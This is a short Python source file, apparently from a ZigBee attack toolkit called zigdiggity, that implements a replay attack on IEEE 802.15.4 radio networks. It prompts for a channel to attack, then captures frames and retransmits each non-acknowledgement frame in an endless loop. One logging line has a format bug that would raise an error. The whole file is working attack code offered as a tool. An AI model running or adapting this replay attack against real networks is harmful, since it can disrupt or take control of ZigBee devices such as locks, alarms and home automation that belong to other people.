#!/usr/bin/env python

from zigdiggity.interface.console import print_notify
from zigdiggity.packets.dot15d4 import is_ack
from PyInquirer import prompt
from zigdiggity.misc.utils import NumberValidator


class ReplayAttack():
    def __init__(self, radio):
        self.radio = radio

    def listen(self):
        channelAns = prompt([{
            'type': 'input',
            'name': 'channel',
            'message': 'Which channel would you like to attack?',
            'validate': NumberValidator,
            'filter': lambda val: int(val)
        }])

        if "channel" in channelAns:
            return self.start_listening(channelAns["channel"])
        return False

    def start_listening(self, channel):
        # if args.wireshark:
        #     observer_utils.register_wireshark(radio)
        #     print_notify("Registered Wireshark Observer")

        self.radio.set_channel(channel)

        print_notify("Listening to channel %d" % self.radio.get_channel())

        interrupted = False

        while True:
            frame = self.radio.receive()
            if not is_ack(frame):
                self.radio.send(frame)
                print_notify("Replayed packet frame..." %
                             self.radio.get_channel())
        return True
